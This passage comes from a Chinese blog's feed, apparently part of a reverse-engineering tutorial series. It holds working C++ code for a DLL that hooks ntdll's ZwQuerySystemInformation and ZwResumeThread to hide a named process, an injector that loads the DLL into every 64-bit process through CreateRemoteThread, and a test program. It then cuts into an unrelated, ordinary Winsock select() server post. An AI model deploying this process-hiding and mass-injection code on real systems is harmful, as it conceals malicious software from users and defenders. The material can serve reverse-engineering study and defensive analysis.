class="built_in">reinterpret_cast</span>&lt;PZwResumeThread&gt;(<span class="built_in">getProc</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>));</span><br><span class="line">NTSTATUS status = <span class="built_in">pZwResumeThread</span>(threadHandle, SuspendCount);</span><br><span class="line"></span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwResumeThread), &amp;orgBytesB[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">setProcName</span>(<span class="string">L&quot;Notepad.exe&quot;</span>);</span><br><span class="line"><span class="function">std::string <span class="title">curProc</span><span class="params">(MAX_PATH, <span class="string">&#x27;\0&#x27;</span>)</span></span>;</span><br><span class="line"><span class="type">char</span>* p = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="built_in">GetModuleFileNameA</span>(<span class="literal">nullptr</span>, &amp;curProc[<span class="number">0</span>], curProc.<span class="built_in">size</span>());</span><br><span class="line">p = <span class="built_in">const_cast</span>&lt;<span class="type">char</span>*&gt;(<span class="built_in">strrchr</span>(curProc.<span class="built_in">c_str</span>(), <span class="string">&#x27;\\&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">nullptr</span> &amp;&amp; !_stricmp(p + <span class="number">1</span>, <span class="string">&quot;DLL_inject.exe&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"><span class="comment">/*CreateThread(nullptr, 0, startHide, nullptr, 0, nullptr);*/</span></span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwQuerySystemInformation), &amp;orgBytesA[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwResumeThread), &amp;orgBytesB[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注入器本来应该实现全局注入，但是由于我这边不知道为什么一注就挂，所以就没有全局，只单独选择了exploer，这里的代码和之前的是一样的，如果想继续测试全局注入，可以试试：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Is64BitProcess</span><span class="params">(DWORD dwPID)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPID);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL isWow64 = FALSE;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsWow64Process</span>(hProcess, &amp;isWow64)) &#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !isWow64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123; <span class="comment">// 取得对应 PID 句柄</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;Open process %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line"></span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Memory allocation failed in process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;WriteProcessMemory failed in process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HMODULE hKernel32 = <span class="built_in">GetModuleHandle</span>(_T(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (hKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetModuleHandle failed\n&quot;</span>));</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pThreadProc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetProcAddress failed\n&quot;</span>));</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateRemoteThread failed in process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;DLL injected successfully into process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">injectAllProcesses</span><span class="params">(LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateToolhelp32Snapshot failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROCESSENTRY32 pe;</span><br><span class="line">pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapshot, &amp;pe)) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (pe.th32ProcessID &lt;= <span class="number">100</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">Is64BitProcess</span>(pe.th32ProcessID)) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Skipping 32-bit process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!_tcsicmp(pe.szExeFile, <span class="string">L&quot;StartMenuExperienceHost.exe&quot;</span>) ||</span><br><span class="line">!_tcsicmp(pe.szExeFile, <span class="string">L&quot;ShellExperienceHost.exe&quot;</span>) ||</span><br><span class="line">!_tcsicmp(pe.szExeFile, <span class="string">L&quot;LockApp.exe&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Skipping process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;Attempting to inject into 64-bit process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">inject</span>(pe.th32ProcessID, szDllPath)) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Successfully injected into process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Failed to inject into process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Process32First failed\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[]) &#123;</span><br><span class="line"><span class="comment">//if (argc != 2) &#123;</span></span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;USAGE: %s dll_path\n&quot;), argv[0]);</span></span><br><span class="line"><span class="comment">//return 1;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">TCHAR dllpath[] = <span class="string">L&quot;xxx\\source\\repos\\HideProcess\\x64\\Debug\\HideProcess.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">injectAllProcesses</span>(dllpath);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于是64位，不能用taskmgr测试QAQ，所以写了一个测试程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// 获取 ZwQuerySystemInformation 函数地址</span></span><br><span class="line"><span class="comment">//setProcName(L&quot;notepad.exe&quot;);</span></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">PZwQuerySystemInformation pZwQuerySystemInformation = <span class="built_in">reinterpret_cast</span>&lt;PZwQuerySystemInformation&gt;(</span><br><span class="line"><span class="built_in">getProc</span>(<span class="string">&quot;Ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (pZwQuerySystemInformation == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to get ZwQuerySystemInformation address!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hookByCode(&quot;Ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;, reinterpret_cast&lt;PROC&gt;(myZwQuerySystemInformation), &amp;orgBytesA[0]);</span></span><br><span class="line"><span class="comment">// 定义缓冲区大小</span></span><br><span class="line">ULONG bufferSize = <span class="number">1024</span> * <span class="number">1024</span>; <span class="comment">// 初始缓冲区大小（1MB）</span></span><br><span class="line">PVOID buffer = <span class="built_in">malloc</span>(bufferSize);</span><br><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to allocate memory!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 ZwQuerySystemInformation</span></span><br><span class="line">NTSTATUS status;</span><br><span class="line"><span class="keyword">while</span> ((status = <span class="built_in">pZwQuerySystemInformation</span>(</span><br><span class="line"><span class="number">5</span>, <span class="comment">// SystemProcessInformation</span></span><br><span class="line">buffer,</span><br><span class="line">bufferSize,</span><br><span class="line">&amp;bufferSize</span><br><span class="line">)) == STATUS_INFO_LENGTH_MISMATCH) &#123;</span><br><span class="line"><span class="comment">// 如果缓冲区不够大，重新分配更大的缓冲区</span></span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line">bufferSize *= <span class="number">2</span>;</span><br><span class="line">buffer = <span class="built_in">malloc</span>(bufferSize);</span><br><span class="line"><span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to allocate memory!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;ZwQuerySystemInformation failed with status: &quot;</span> &lt;&lt; status &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历进程信息</span></span><br><span class="line">PSYSTEM_PROCESS_INFORMATION pProcessInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(buffer);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// 输出进程ID和进程名</span></span><br><span class="line">std::wcout &lt;&lt; <span class="string">&quot;Process ID: &quot;</span> &lt;&lt; <span class="built_in">reinterpret_cast</span>&lt;DWORD&gt;(pProcessInfo-&gt;UniqueProcessId)</span><br><span class="line">&lt;&lt; <span class="string">&quot;, Process Name: &quot;</span> &lt;&lt; (pProcessInfo-&gt;ImageName.Buffer ? pProcessInfo-&gt;ImageName.Buffer : <span class="string">L&quot;Unknown&quot;</span>)</span><br><span class="line">&lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移动到下一个进程</span></span><br><span class="line"><span class="keyword">if</span> (pProcessInfo-&gt;NextEntryOffset == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pProcessInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(</span><br><span class="line"><span class="built_in">reinterpret_cast</span>&lt;BYTE*&gt;(pProcessInfo) + pProcessInfo-&gt;NextEntryOffset</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放缓冲区</span></span><br><span class="line"><span class="built_in">free</span>(buffer);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过测试，notepad可以隐藏</p>]]></content>
    
    
    <summary type="html">本篇说明进程隐藏的工作原理</summary>
    
    
    
    <category term="逆向工程核心原理" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="技能" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="Hook" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/Hook/"/>
    
    
    <category term="win" scheme="https://www.pri87.vip/tags/win/"/>
    
  </entry>
  
  <entry>
    <title>网路编程2-SELECT</title>
    <link href="https://www.pri87.vip/posts/574e749a.html"/>
    <id>https://www.pri87.vip/posts/574e749a.html</id>
    <published>2025-02-23T13:01:42.000Z</published>
    <updated>2025-02-27T04:18:18.939Z</updated>
    
    <content type="html"><![CDATA[<h2 id="select">select</h2><p>select维护了一个监测队列，当我们把需要的文件描述符传入时，它就会主动监测其中的内容。</p><p>一般格式为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fd_set fdRead;<span class="comment">//监测队列</span></span><br><span class="line"><span class="built_in">FD_ZERO</span>(&amp;fdRead);</span><br><span class="line"><span class="built_in">FD_SET</span>(servSock, &amp;fdRead);<span class="comment">//sock加入监测队列</span></span><br><span class="line"><span class="keyword">for</span> (SOCKET client : clientList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">FD_SET</span>(client, &amp;fdRead);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> selectRes = <span class="built_in">select</span>(<span class="number">0</span>, &amp;fdRead, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;tv);<span class="comment">//selectRes表明select是否监测到sock的活动</span></span><br></pre></td></tr></table></figure><p>由于服务器socket活动时表明有新连接<br>客户端socket活动时表明有数据发送，<br>所以通过这个区别来添加新客户端和发送信息。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Server::coreFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(servSock != INVALID_SOCKET);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;  <span class="comment">// 无限循环，持续处理事件</span></span><br><span class="line">        <span class="comment">// 1. 初始化 fd_set，添加服务端套接字和所有客户端套接字</span></span><br><span class="line">        fd_set fdRead;</span><br><span class="line">        <span class="built_in">FD_ZERO</span>(&amp;fdRead);</span><br><span class="line">        <span class="built_in">FD_SET</span>(servSock, &amp;fdRead);  <span class="comment">// 监控服务端套接字（新连接）</span></span><br><span class="line">        <span class="keyword">for</span> (SOCKET client : clientList) &#123;</span><br><span class="line">            <span class="built_in">FD_SET</span>(client, &amp;fdRead);  <span class="comment">// 监控所有客户端套接字（数据到达）</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 调用 select，设置超时时间为 1 秒</span></span><br><span class="line">        timeval tv&#123; <span class="number">1</span>, <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="type">int</span> selectRes = <span class="built_in">select</span>(<span class="number">0</span>, &amp;fdRead, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, &amp;tv);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 处理 select 结果</span></span><br><span class="line">        <span class="keyword">if</span> (selectRes &gt; <span class="number">0</span>) &#123;  <span class="comment">// 有套接字活动</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; fdRead.fd_count; ++i) &#123;  <span class="comment">// 遍历活跃的套接字</span></span><br><span class="line">                SOCKET activeSock = fdRead.fd_array[i];</span><br><span class="line">                <span class="keyword">if</span> (activeSock == servSock) &#123;  <span class="comment">// 服务端套接字活跃：新连接</span></span><br><span class="line">                    SOCKET clntSock = <span class="built_in">accept</span>(servSock, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clntSock == INVALID_SOCKET) &#123;</span><br><span class="line">                        std::cout &lt;&lt; <span class="string">&quot;accept error&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    clientList.<span class="built_in">push_back</span>(clntSock);  <span class="comment">// 将新客户端加入列表</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 客户端套接字活跃：数据到达</span></span><br><span class="line">                    <span class="built_in">recvMsg</span>(fdRead, activeSock);  <span class="comment">// 接收并处理数据</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span 